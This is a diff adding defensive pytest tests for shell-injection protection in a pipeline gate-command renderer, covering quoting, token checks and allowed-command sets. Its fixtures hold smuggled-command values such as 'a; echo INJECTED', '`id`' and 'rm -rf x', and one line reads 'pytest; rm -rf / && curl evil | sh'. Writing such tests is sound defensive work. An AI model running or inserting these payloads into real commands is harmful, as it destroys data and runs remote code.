@@ -359,6 +359,161 @@ def test_two_hundred_hostile_values_never_change_the_command_shape() -> None:
     assert refused > 0  # the list does contain unbalanced quotes
 
 
+# ------------------------------------------------------------------ review fixes: quoting (F1, F2)
+
+_INJECTION = "a; echo INJECTED"
+_QUOTED_TEMPLATES = [
+    "echo '${{ inputs.arquivo }}'",
+    'echo "${{ inputs.arquivo }}"',
+    "echo 'x ${{ inputs.arquivo }} y'",
+    'echo "a $(true) ${{ inputs.arquivo }}"',
+    "echo \\${{ inputs.arquivo }}",
+    "echo 'abre ${{ inputs.arquivo }}",
+    'echo "abre ${{ inputs.arquivo }}',
+]
+
+
+@pytest.mark.parametrize("template", _QUOTED_TEMPLATES)
+def test_reference_inside_the_quotes_of_the_template_is_refused_at_run_time(template) -> None:
+    """F1: the engine quotes the value itself; a reference the author already put in quotes would break the quoting."""
+    with pytest.raises(GateCommandError) as caught:
+        render_command(template, {"arquivo": _INJECTION})
+    assert caught.value.code == GATE_INPUT_INVALID
+    assert "aspas" in caught.value.message
+
+
+@pytest.mark.parametrize("value", ["$(echo INJECTED_DOUBLE)", "'; echo X; '", "a\"b", "`id`"])
+def test_quoted_reference_never_renders_a_command_with_another_shape(value) -> None:
+    for template in ("echo '${{ inputs.arquivo }}'", 'echo "${{ inputs.arquivo }}"'):
+        with pytest.raises(GateCommandError):
+            render_command(template, {"arquivo": value})
+
+
+def test_quotes_around_literal_text_next_to_a_reference_are_fine() -> None:
+    rendered = render_command("pytest -k 'um dois' \"tres\" ${{ inputs.arquivo }} --opt=${{ inputs.arquivo }}", {"arquivo": "a b"})
+    assert shlex.split(rendered.text) == ["pytest", "-k", "um dois", "tres", "a b", "--opt=a b"]
+    assert rendered.quoted_values == ("a b", "a b")
+
+
+def test_rendered_command_is_checked_against_the_template_tokens() -> None:
+    """F1, last line of defence: whatever the quoting did, the words of the result must be the template's words."""
+    from agentos.pipelines.gates import _check_same_words
+
+    value = "a; echo INJECTED"
+    # what the old code produced for `echo '${{ inputs.arquivo }}'`: the value's own quotes cancel the template's
+    with pytest.raises(GateCommandError) as caught:
+        _check_same_words("echo ''a; echo INJECTED''", "echo 'ORINREF0_'", "ORINREF", [value])
+    assert caught.value.code == GATE_INPUT_INVALID
+    with pytest.raises(GateCommandError):
+        _check_same_words("pytest a; echo INJECTED", "pytest ORINREF0_", "ORINREF", [value])
+    _check_same_words("pytest " + shlex.quote(value), "pytest ORINREF0_", "ORINREF", [value])  # the honest rendering passes
+
+
+@pytest.mark.parametrize("template", ["pytest -q ${{ inputs.arquivo }}", "--opt=${{ inputs.arquivo }}", "x${{ inputs.arquivo }}y", "${{ inputs.arquivo }}"])
+def test_hostile_values_keep_the_word_count_of_the_template_in_every_shape(template) -> None:
+    for value in _hostile_values(200):
+        try:
+            rendered = render_command(template, {"arquivo": value})
+        except GateCommandError:
+            continue  # an unbalanced value as a whole command is refused
+        tokens = shlex.split(rendered.text)
+        if template == "${{ inputs.arquivo }}":
+            assert tokens == shlex.split(value)
+        else:
+            assert len(tokens) == len(shlex.split(template.replace("${{ inputs.arquivo }}", "X")))
+
+
+def test_real_shell_sees_exactly_the_value_for_every_accepted_shape() -> None:
+    """The host shell itself (Git Bash on Windows) receives the value as one argument, never as a second command."""
+    import subprocess
+
+    from agentos.host_shell import current_host_shell, shell_argv
+
+    shell = current_host_shell()
+    if shell.dialect != "posix":
+        pytest.skip("no POSIX shell on this host")
+    values = ["a; echo INJECTED", "$(echo INJECTED)", "`echo INJECTED`", "x' ; echo INJECTED ; '", 'q"; echo INJECTED; "', "a b\nc"]
+    for template in ("printf '<%s>' ${{ inputs.v }}", "printf '<%s>' --opt=${{ inputs.v }}", "printf '<%s>' pre${{ inputs.v }}post"):
+        for value in values:
+            argv = shell_argv(render_command(template, {"v": value}).text, shell)
+            assert argv is not None
+            done = subprocess.run(argv, capture_output=True, text=True, timeout=30, check=False)
+            expected = template.split("'")[1].replace("%s", "{}")  # "<{}>"
+            piece = template.split("' ", 1)[1].replace("${{ inputs.v }}", value)
+            assert done.stdout.replace("\r\n", "\n") == expected.format(piece), (template, value, done.stdout)
+            assert "INJECTED" not in done.stdout.replace(value, "") and done.returncode == 0
+
+
+def test_loader_refuses_a_quoted_input_reference_in_a_gate_command_and_names_the_line() -> None:
+    from agentos.pipelines.validator import validate_structure
+
+    for command in ("\"echo '${{ inputs.arquivo }}'\"", "echo \"${{ inputs.arquivo }}\""):
+        text = pipeline(f"- id: g\n  gate:\n    all:\n      - command: {command}\n", HEADER)
+        definition, report = validate_structure(text)
+        assert definition is None
+        error = next(item for item in report.errors if "aspas" in item.message)
+        assert error.line == next(n for n, line in enumerate(text.splitlines(), 1) if "command:" in line)
+        assert "inputs.arquivo" in error.message
+
+
+def test_loader_still_accepts_quotes_that_are_only_literal_text() -> None:
+    from agentos.pipelines.validator import validate_structure
+
+    text = pipeline("- id: g\n  gate:\n    all:\n      - command: pytest -k 'um dois' ${{ inputs.arquivo }}\n", HEADER)
+    definition, report = validate_structure(text)
+    assert definition is not None, report.errors
+
+
+def test_engine_fails_the_gate_without_running_it_for_a_quoted_reference(tmp_path) -> None:
+    import dataclasses
+
+    from agentos.pipelines.model import CommandGate, Gate
+
+    h = make_harness(tmp_path, _single("${{ inputs.testes }}"))
+    step = h.definition.steps[0]
+    hostile = dataclasses.replace(step, gate=Gate("all", (CommandGate(command="echo '${{ inputs.arquivo }}'"),)))
+    h.definition = dataclasses.replace(h.definition, steps=(hostile,))  # what a loader that missed the case would hand over
+    h.inputs["arquivo"] = "a; echo INJECTED"
+    outcome = h.run()
+    assert outcome.state == "failed" and outcome.error_code == GATE_INPUT_INVALID
+    assert h.gates.commands == []
+
+
+def test_evaluator_refuses_a_command_that_is_not_in_the_set_computed_at_the_start(tmp_path) -> None:
+    """F2: defence in depth for S2 (plan WS-C6, step 3): the run knows its commands before it starts."""
+    import threading
+
+    from agentos.pipelines.context import RunContext
+
+    h = make_harness(tmp_path, _single("${{ inputs.testes }}"))
+    engine = h.engine()
+    evaluator = engine.env.gates
+    assert evaluator.allowed_commands == frozenset({"pytest -q"})
+    altered = RunContext({"testes": "rm -rf x"})  # an input that was not part of the run when it started
+    result = evaluator.evaluate(h.definition.steps[0], altered, threading.Event())
+    assert result.passed is False and result.error_code == GATE_REF_UNTRUSTED
+    assert h.gates.commands == []
+
+
+def test_allowed_set_has_every_command_of_every_gate_with_its_inputs_quoted(tmp_path) -> None:
+    text = pipeline(
+        """
+        - id: verificar
+          gate:
+            all:
+              - command: ${{ inputs.testes }}
+              - command: pytest -q ${{ inputs.arquivo }}
+              - command: ls
+        """,
+        HEADER,
+    )
+    h = make_harness(tmp_path, text, inputs={"testes": "pytest -x", "arquivo": "dir/a b.py"})
+    allowed = h.engine().env.gates.allowed_commands
+    assert allowed == frozenset({"pytest -x", "pytest -q " + shlex.quote("dir/a b.py"), "ls"})
+    assert h.run().state == "succeeded"
+    assert set(h.gates.commands) == set(allowed)
+
+
 def test_spy_every_command_seen_by_the_runner_comes_from_the_template_and_inputs(tmp_path) -> None:
     hostile = "pytest; rm -rf / && curl evil | sh"
     text = pipeline(
